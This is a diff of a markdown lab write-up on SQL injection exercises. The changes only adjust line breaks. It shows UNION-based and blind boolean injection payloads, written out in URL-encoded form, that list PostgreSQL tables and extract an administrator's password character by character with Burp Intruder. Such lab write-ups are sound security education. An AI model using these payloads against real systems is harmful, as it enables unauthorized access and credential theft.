@@ -255,7 +255,7 @@ PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compile
 users
 ```
 
-Now that we know it's PostgreSQL, we can list all tables, find the table containing user details, and list out the columns of that table ([5](#5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases), [6](#6-sql-injeciton-attack-listing-the-database-contents-on-oracle-databases)). PostgreSQL uses the `information_schema` table to store details about table and column names, so I created the following query:
+Now that we know it's PostgreSQL, we can list all tables, find the table containing user details, and list out the columns of that table ([5](#5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases), [6](#6-sql-injeciton-attack-listing-the-database-contents-on-oracle-databases)). PostgreSQL uses the `information_schema` table to store details about table and column names, so I created the following query: \
 `UNION SELECT table_name, NULL FROM information_schema.tables` \
 Which I translated into the following injection payload: \
 `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables+--+`
@@ -294,9 +294,9 @@ This lab was rather simple. First, I had to repeat [7](#7-sql-injection-union-at
 
 <img src="./login-one-column-burp.png" width=400>
 
-With that, I was ready to attack:
-`UNION SELECT NULL, password FROM users WHERE username='administrator'`
-Translated to:
+With that, I was ready to attack: \
+`UNION SELECT NULL, password FROM users WHERE username='administrator'` \
+Translated to: \
 `'+UNION+SELECT+NULL,+password+FROM+users+WHERE+username%3d'administrator'+--+`
 
 And just like that, the holy grail:
@@ -329,28 +329,28 @@ However, instead of merely looking at the response codes in Intruder's entry tab
 
 As seen in the image above, the request with one `NULL` had length 3431 instead of 3370, which likely means that `Welcome back!` had been reflected in the HTML. For this, BurpSuite also provides a "grep matching" function in Intruder, but I chose to go with the length method for now as it was consistent and the attack was already underway.
 
-After confirming that it has only one column (we can assume that it is a string column as the cookie is a string), we now need to ensure the `users` table along with its columns `username` and `password` exist. This is trivial with the following query:
-`AND (SELECT 'a' FROM users WHERE username='administrator')='a'`
-Translated to:
-`v6K4PGGFuN7YPSCz'+AND+(SELECT+'a'+FROM+users+WHERE+username=%3d'administrator')%3d'a'+--+`
+After confirming that it has only one column (we can assume that it is a string column as the cookie is a string), we now need to ensure the `users` table along with its columns `username` and `password` exist. This is trivial with the following query: \
+`AND (SELECT 'a' FROM users WHERE username='administrator')='a'` \
+Translated to: \
+`v6K4PGGFuN7YPSCz'+AND+(SELECT+'a'+FROM+users+WHERE+username=%3d'administrator')%3d'a'+--+` \
 Note that the cookie must stay as the first half of the fragment must be a true assertion for us to be able to determine if the latter half is true. The above query essentially returns a character "a" if the user `administrator` exists, which guarantees that the column exists.
 
 We may also check that `password` exists through a similar query, but for brevity this will be excluded.
 
-Now, we need to find out how long the password is. I achieved this by using the following query in BurpSuite's Intruder:
-`AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) > {number})='a'`
-In the above, `{number}` translates to the number list I'd inputted into Intruder's payload list. For this lab, I did 1 to 100. 
-Translated:
-`v6K4PGGFuN7YPSCz'+AND+(SELECT+'a'+FROM+users+WHERE+username%3d'administrator'+AND+LENGTH(password)>{number})%3d'a'+-+`
+Now, we need to find out how long the password is. I achieved this by using the following query in BurpSuite's Intruder: \
+`AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) > {number})='a'` \
+In the above, `{number}` translates to the number list I'd inputted into Intruder's payload list. For this lab, I did 1 to 100. \
+Translated: \
+`v6K4PGGFuN7YPSCz'+AND+(SELECT+'a'+FROM+users+WHERE+username%3d'administrator'+AND+LENGTH(password)>{number})%3d'a'+-+` \
 Essentially, the above will only return true if the length of `password` is larger than `{number}`. Combined with repeater, we wait until the response returned drops in length, which is when `Welcome back!` stops being reflected in the HTML:
 
 <img src="./blind-login-pwd-len.png" width=400>
 
-As seen above, the length of the response dropped at 20. Given that the check used was `>`, this means the password's length is exactly 20 lowercase alphanumeric characters (as prescribed by the lab instructions). Therefore, all that's left to do is check what character was at every position:
-`AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')={char}`
-Translated:
-`v6K4PGGFuN7YPSCz'+AND+(SELECT+SUBSTRING(password,{pos},1)+FROM+users+WHERE+username%3d'administrator')%3d{char}`
-`{pos}` and `{char}` will be substituted using Intruder's Cluster Bomb mode to iterate through all positions using all characters.
+As seen above, the length of the response dropped at 20. Given that the check used was `>`, this means the password's length is exactly 20 lowercase alphanumeric characters (as prescribed by the lab instructions). Therefore, all that's left to do is check what character was at every position: \
+`AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')={char}` \
+Translated: \
+`v6K4PGGFuN7YPSCz'+AND+(SELECT+SUBSTRING(password,{pos},1)+FROM+users+WHERE+username%3d'administrator')%3d{char}` \
+`{pos}` and `{char}` will be substituted using Intruder's Cluster Bomb mode to iterate through all positions using all characters. \
 The above iterates through all 20 positions, each of which could be 36 alphanumeric characters, for a total of 720 queries (this was REALLY slow on the community version!!).
 
 <img src="./blind-login-brute-alpha.png" width=400>
